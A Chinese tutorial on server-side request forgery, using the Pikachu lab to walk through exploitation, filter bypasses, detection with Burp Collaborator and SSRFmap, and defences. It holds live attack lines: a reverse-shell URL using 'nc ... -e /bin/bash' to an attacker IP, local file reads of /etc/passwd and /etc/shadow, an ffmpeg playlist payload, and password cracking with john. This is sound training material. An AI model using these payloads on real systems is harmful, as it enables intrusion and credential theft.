---
title: SSRF 服务端请求伪造
description: SSRF 漏洞原理与利用：服务端发起请求的绕过技巧（内网探测、协议利用）、危害分析与检测防御
keywords: ['SSRF', '服务端请求伪造', '内网探测', '绕过技巧']
category: 安全
tags: ['Web安全', 'SSRF', '漏洞']
---

# SSRF 服务端请求伪造

前文介绍了 CSRF 漏洞的产生原理、攻击手法、检测与防御手段，本节介绍 SSRF。

从名字来看，SSRF 跟 CSRF 就有点相近，其实它们的技术原理也有相似之处，但攻击目标完全不同：SSRF 是针对服务端的攻击。

## 什么是 SSRF 漏洞？

SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL，以获取受保护网络内的资源的一种安全漏洞。SSRF 常被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问限制的主机。

SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。

请求地址被恶意利用的话，就能够以服务端的身份向任意地址发起请求，如果是一台存在远程代码执行漏洞的内网机器，借助 SSRF 漏洞就可以获取该内网机器的控制权。

所以说，在 SSRF 漏洞面前，哪怕是外网隔离的内网机器也无法保证绝对的安全。

以 Pikachu 靶场中的 SSRF（curl）题目为例，点击“累了吧，来读一首诗吧”之后会发起以下请求：

```text
http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php
```

**注意其中的 url 参数，** 如果将其修改为“http://baidu.com”：

```text
http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://baidu.com
```

那么它就会打开百度，这是服务端在向百度发起请求，并将返回内容回显到页面上的结果。

查看 ssrf（curl）题目的关键 php 源码，你会发现源码中本就有一些注释和利用思路的提示：

```php
<?php
	$PIKA_ROOT_DIR =  "../../";
	include_once $PIKA_ROOT_DIR.'header.php';

	//payload:
	//file:///etc/passwd  读取文件
	//http://192.168.1.15:22 根据 banner 返回,错误提示,时间延迟扫描端口

	if(isset($_GET['url']) && $_GET['url'] != null){

	    //接收前端 URL 没问题,但是要做好过滤,如果不做过滤,就会导致 SSRF
	    $URL = $_GET['url'];
	    $CH = curl_init($URL);
	    curl_setopt($CH, CURLOPT_HEADER, FALSE);
	    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
	    $RES = curl_exec($CH);
	    curl_close($CH) ;
	//ssrf 的问题是:前端传进来的 url 被后台使用 curl_exec()进行了请求,然后将请求的结果又返回给了前端
	//除了 http/https 外,curl 还支持一些其他的协议 curl --version 可以查看其支持的协议,telnet
	//curl 支持很多协议，有 FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP
	    echo $RES;
	}
?>
```

漏洞的产生正是将 GET 参数 url 直接传递给 curl_exec 去访问，并调用 echo 将请求结果输出到页面，这正是设置“url=http://baidu.com”后，会打开百度的原因。

## SSRF 的危害

基于前面介绍的 SSRF 原理，可以梳理出它可能出现的一些危害。

- **内网探测**：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描。

- **窃取本地和内网敏感数据**：访问和下载内网的敏感数据，利用 File 协议访问服务器本地文件。

- **攻击服务器本地或内网应用**：利用发现的漏洞进一步发起攻击利用。

- **跳板攻击**：借助存在 SSRF 漏洞的服务器对内或对外发起攻击，以隐藏自己真实 IP。

- **绕过安全防御**：比如防火墙、CDN（内容分发网络，比如加速乐、百度云加速、安全宝等等）防御。

- **拒绝服务攻击**：请求超大文件，保持链接 Keep-Alive Always。

你可以自己发挥脑洞去挖掘更多的可能的攻击场景。

## 常见的利用与限制绕过方法

说了这么多，那来看一下 SSRF 漏洞常见的利用方法和绕过限制的手段。

### 1.利用支持的 URL Schema 发起请求伪造

不仅仅只是常见的 http/https 协议。以 curl 为例，除 http/https 外它还支持 file、gopher、dict、ftp、ftps、tftp、telnet、ldap、sftp 等多种协议（可通过 curl --version 查看支持列表），OWASP 也曾整理过一份相对比较完整的 URL Schema 列表可供参考。

在利用初期，你可以尝试下目标支持哪些 URL Schema，但有一点需要提醒下：**有些应用会自定义一些 URL Schema，如果它支持本地或网络地址请求，要注意避免遗漏掉**。

### 2.读取本地文件

从上面列出的协议可以看到，除了 http/https 协议外，file 也是各场景通用的伪协议，利用它可以读取服务器的本地文件，比如 /etc/passwd、/proc/self/environ……

### 3.攻击内网应用漏洞

前期可以利用 SSRF 漏洞对内网存活 IP 或域名进行漏洞扫描。以前在公司就曾遇到过这样一种情况：有些业务为了测试，在内网搭建了一些存在漏洞；或是有漏洞没有及时修复，理由是在内网没影响。然后，有一些被外部 SSRF 漏洞打进来了，利用了 Struts2 漏洞控制了内网服务器。

比如内网有一台存在代码执行漏洞（http://192.168.x.x/vul.php?cmd=whoami）的服务器未开外网，那么攻击者就可以利用 SSRF 漏洞来攻击该内网服务器。以 Pikachu 靶场 SSRF（curl）题目为例，可以构造如下链接来获取内网服务器的 shell 控制权限：

```text
http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://192.168.x.x/vul.php?cmd=nc [攻击者 ip] 4444 -e /bin/bash
```

### 4.绕过 IP 限制

有些网站可能会限制访问 IP，此时就可以尝试使用以下方法绕过：

- **IPv6 地址**，如 http://2000::1:2345:6789:abcd；

- **十进制 IP**，如 http://2130706433，相当于 127.0.0.1；

- **八进制 IP**，如 http://0177.0.0.01，相当于 127.0.0.1；

- **十六进制 IP**，如 http://0x7f.0x0.0x0.0x1，相当于 127.0.0.1；

- **多进制混合 IP**，如 http://0177.0x0.0x0.1，相当于 127.0.0.1；

- **Localhost 替代**，如 http://127.127.127.127、http://0.0.0.0、http://127.1 等。

### 5.绕过 URL 解析限制

如果存在 URL 限制，可以尝试以下方法绕过：

- **使用其他可用的协议**，可参考上面列出的协议进行测试；

- **URL 欺骗方式**，如 http://127.1.1.1@127.2.2.2、http://evil$google.com、http://google.com#@evil.com……

- **302 跳转切换协议**，如请求头注入"Location: dict://lagou.com"

- **Unicode 转换**，如 http://evil.c ℀.office.com

以上向你介绍了一些常见的 SSRF 限制策略与绕过手段，这些情况还是比较常用的，甚至有些漏洞修复后，用上述方法又被绕过了。掌握限制绕过方法也是挖掘 SSRF 漏洞的必备技巧，下面，再来介绍下如何挖掘 SSRF 漏洞。

## SSRF 漏洞挖掘思路

要进行 SSRF 漏洞的防御，先要判断是否存在 SSRF 漏洞。

### 1.如何判断是否存在 SSRF 漏洞

判断 SSRF 漏洞是否存在，主要有以下 4 种方式：

- **回显判断**：像前面 Pikachu 案例那种，请求结果有返回并会显示出来的，这种比较好判断。

- **访问日志检查**：伪造请求到自己控制的公网服务器，然后在服务器上查看访问日志是否有来自漏洞服务器的请求，或者直接使用命令“nc -lvp”来监听请求。

- **延时对比**：对比访问不同 IP/域名的访问时长，比如对百度与 Google（国内访问受限）的访问时间，访问百度的时间通常比Google快，若是则可能存在漏洞。

- **DNS 请求检测**：自己搭建 DNS 服务器，或者利用网上的 DNSLog 服务（比如[http://www.dnslog.cn/](http://www.dnslog.cn/)），生成一个域名（l08bgh.dnslog.cn）用于伪造请求，看漏洞服务器是否发起 DNS 解析请求，若成功访问在 DNSLog.cn 上就会有解析日志。

构建以下链接，访问后再 DNSLog 上就会看到相应的解析日志了：

```text
http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://l08bgh.dnslog.cn
```

### 2.容易出现 SSRF 漏洞的业务场景

以上向你介绍了 SSRF 的危害，哪些地方比较容易出现 SSRF 漏洞呢？主要分了 4 个方面来说。

- **凡是能够对外发起网络请求的地方，且地址可被用户可控的，都有可能存在 SSRF 漏洞。** 比如 RSS 订阅、字幕下载、支持输入 URL 的功能、嵌入远程图片、收取第三方邮箱邮件。一些不明显的地方，可以通过爬包分析，从参数名来猜测，比如 url、domain、site、src、target 等常见关键词来做进一步地测试验证。

- **文件处理功能。** 比如负责处理音视频的 ffmpeg，负责处理图片的 ImageMagic、处理办公文件的Office，PDF 文档解析功能，还有 XML 解析器等地方，尤其是 ffmpeg 和 ImageMagic，它们曾多次出现过 SSRF 漏洞。 ffmpeg 在解析 mp4 文件时就曾出现过以下漏洞，构造一个包含以下内容的 mp4 文件，上传到支持音频解析的网站就可能造成 SSRF 漏洞。**这种应用漏洞记得平时多收集，在实际渗透测试时非常有用**。

```text
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,http://192.168.123.100:8080/1.html
#EXT-X-ENDLIST
```

- **社交分享功能**， 社交分享也是容易出现 SSRF 漏洞的地方。

- **信息采集功能**，比如图片、文章收藏、网页快照、网页翻译、网页剪裁。

这里只是列举一些常见的场景，很难完全覆盖 SSRF 容易出现漏洞的场景，但核心思路就是理解业务功能，判断其是否存在对外发起网络请求，若是存在就有可能存在 SSRF 漏洞，然后进一步实际验证下，可以用下面介绍的 Burp Collaborator 作验证。

## 检测 SSRF 的通用方法和工具

### 1.方法：Burp Collaborator

这里介绍个检测 SSRF 的通用方法，无论是否有回显都适用的，也是比较喜欢用的，那就是 Burp Collaborator。BurpSuite 默认提供 Collaborator Server 用于实现 DNS 解析，在一些无回显的安全测试中，会将解析日志返回给 BurpSuite。

> 不仅仅用于 SSRF，一些无回显的漏洞测试也同样适用，比如 SQL 注入。

关于 Burp Collaborator 的原理：先利用 SSRF 漏洞让目标应用向 Burp 提供的 DNS 解析服务器（Burp Collaborator Server）发起请求，然后 Burp Collaborator Server 会记录对应的 DNS 请求并返回给 BurpSuite，从而帮助测试者判断 SSRF 漏洞是否存在。

仍以前面的靶场题目为例，打开 Burp Collaborator Client：

点击“Copy to clipboard”获取生成的域名，这里生成的是“c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net”，就可以构造如下利用链接：

```text
http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net
```

访问后回到 Burp Collaborator client，点击“Poll now”就可以看到 DNS 请求记录，这说明存在 SSRF 漏洞。

这个检测方法比较通用简单，且无须自己搭建 DNS 服务器，非常方便，强烈推荐。

### 2.工具：SSRFmap

这里给大家介绍一款 SSRF 检测工具：[SSRFmap](https://github.com/swisskyrepo/SSRFmap)，利用它可检测与利用 SSRF 漏洞， 同时它也整合了一些常用漏洞可以结合 SSRF 去利用，比如 fastjson、mysql、github 的一些历史漏洞，还有端口扫描、读取文件等利用功能，都是实用的漏洞利用能力。

使用上会比 Burp Collaborator 便捷，但检测能力上其实没有 Burp Collaborator 那样准确，SSRFmap 有时会利用失败。所以个人推荐使用 Burp Collaborator 用来检测 SSRF 是否存在，再使用 SSRFmap 做一些漏洞利用，比如读取敏感文件等操作。

SSRFmap 是以 HTTP 请求数据作为文件输入，用其自带的测试用例试试：

```shell
FLASK_APP=data/example.py flask run &
python ssrfmap.py -r data/request.txt -p url -m readfiles
```

其中 data/request.txt 内容如下：

```http
POST /ssrf HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mysimple.ssrf/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close
Upgrade-Insecure-Requests: 1
url=https%3A%2F%2Fwww.google.fr%
```

使用 readfiles 模块即可批量读取目标服务器上的敏感文件，比如 /etc/passwd、/etc/hosts。

以上用例在读取敏感文件之后就戛然而止了，没有下文了。比如你想破解主机密码，就可以读取文件 /etc/shadow 以获得用户名和密码密文，然后就可以用 john 去破解密码：

```text
$ sudo cat /etc/shadow
root:$6$TBFgG/seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu/9RPLHvLYSzMfcLj0:18446:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
……
```

加密的密码具有固定格式：

```text
$id$salt$encrypted
```

- id：表示加密算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512。

- salt：表示密码学中的 Salt，由系统随机生成。

- encrypted：表示密码的 hash。

冒号后面的数值是一些日期和密码修改间隔天数的信息，可以不用管，以上述示例中 root 账号为例：

```text
root:$6$TBFgG/seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu/9RPLHvLYSzMfcLj0
id=6，即使用SHA-512哈希算法
salt=TBFgG/seGvOG8nOp
encrypted=LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu/9RPLHvLYSzMfcLj0
```

接下来可以直接使用 john 去破解 shadow 文件：

```shell
# 安装John the Ripper
$ sudo apt install john
$ john
John the Ripper password cracker, version 1.8.0
Copyright (c) 1996-2013 by Solar Designer
……
# 暴力破解获取的shadow文件中的账号密码
$ sudo john ./shadow
```

之后就是时间的等待，暴力破解有时看运气了，运气好的话就拿到服务器的登录账号和密码了。

SSRFmap 会有一些问题，比如 Pikachu 靶场中的 SSRF（curl）题目就没利用成功，而且 portscan 利用模块开启后就死循环，停不下来。这些都是工具的 Bug，在测试时不能完全依赖工具，还是得自己多手工验证。

## SSRF 漏洞防御

有时基于业务功能需要，无法完全限制对外网络请求的功能，这就一定要依据业务场景做一些灵活的变通，不可一刀切。

这里介绍一些常用的 SSRF 防御方法：

- 采用白名单限制，只允许访问特定的 IP 或域名，比如只允许访问招聘网站网域名 *.lagou.com；

- 限制内网 IP 访问，常见的内网 IP 段有 10.0.0.0 - 10.255.255.255、172.16.0.0 - 172.31.255.255、192.168.0.0 - 192.168.255.255；

- 限制对云服务器元数据地址（如 169.254.169.254）的访问，防止通过 SSRF 窃取云主机的临时访问凭证；

- 禁用一些不必要的协议，比如 file://、gopher://、dict://。

另外关闭错误回显、关闭高危端口、及时修复漏洞，哪怕它是处于内网环境，都有助于缓解 SSRF 漏洞的进一步利用。

